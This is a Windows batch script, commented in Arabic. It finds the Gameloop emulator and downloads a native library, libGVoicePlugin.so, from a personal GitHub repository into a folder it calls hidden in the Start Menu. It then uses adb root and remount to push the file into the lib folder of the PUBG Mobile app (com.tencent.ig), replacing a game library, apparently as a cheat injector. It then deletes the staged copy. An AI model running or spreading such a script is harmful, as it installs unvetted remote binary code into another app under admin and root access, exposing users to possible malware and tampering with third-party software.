@echo off
setlocal enabledelayedexpansion

:: التحقق من صلاحيات المسؤول
fltmc >nul 2>&1
if not %errorlevel%==0 (
    echo يرجى تشغيل هذا الملف كمسؤول.
    pause
    exit
)

:: قائمة بالأماكن المحتملة للمحاكي
set "foundPath="
set "possiblePaths=C:\Program Files\TxGameAssistant\ui"

:: البحث في باقي الأقراص من D إلى J
for %%D in (D E F G H I J) do (
    if exist "%%D:\Program Files\TxGameAssistant\ui" (
        set "foundPath=%%D:\Program Files\TxGameAssistant\ui"
        goto :FOUND
    )
)

:: البحث في C:\TxGameAssistant\ui
if exist "C:\TxGameAssistant\ui" (
    set "foundPath=C:\TxGameAssistant\ui"
    goto :FOUND
)

:: البحث في باقي الأقراص لنفس المسار
for %%D in (D E F G H I J) do (
    if exist "%%D:\TxGameAssistant\ui" (
        set "foundPath=%%D:\TxGameAssistant\ui"
        goto :FOUND
    )
)

:: في حالة عدم العثور على المحاكي
echo لم يتم العثور على محاكي Gameloop في أي من المسارات المتوقعة.
pause
exit /b

:FOUND
echo تم العثور على Gameloop في: %foundPath%
cd /d "%foundPath%"

:: تحديد المسار المخفي لحفظ الملف
set hiddenPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\SystemTools
if not exist "%hiddenPath%" mkdir "%hiddenPath%"

:: تحديد اسم الملف
set fileName=libGVoicePlugin.so

:: تحميل الملف باستخدام PowerShell
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/jack74512/UAO7/raw/refs/heads/main/%fileName%' -OutFile '%hiddenPath%\%fileName%'" 

:: التحقق من نجاح التحميل
if not exist "%hiddenPath%\%fileName%" (
    echo فشل في تحميل الملف.
    exit /b
)

:: بدء أوامر ADB
adb kill-server
adb start-server
adb root
adb remount
adb push "%hiddenPath%\%fileName%" /data/local/tmp/
adb shell mv /data/local/tmp/%fileName% /data/data/com.tencent.ig/lib/

:: تنظيف المسار المخفي
if exist "%hiddenPath%\%fileName%" del "%hiddenPath%\%fileName%"

echo.
echo جميع الأوامر تم تنفيذها بنجاح!
pause
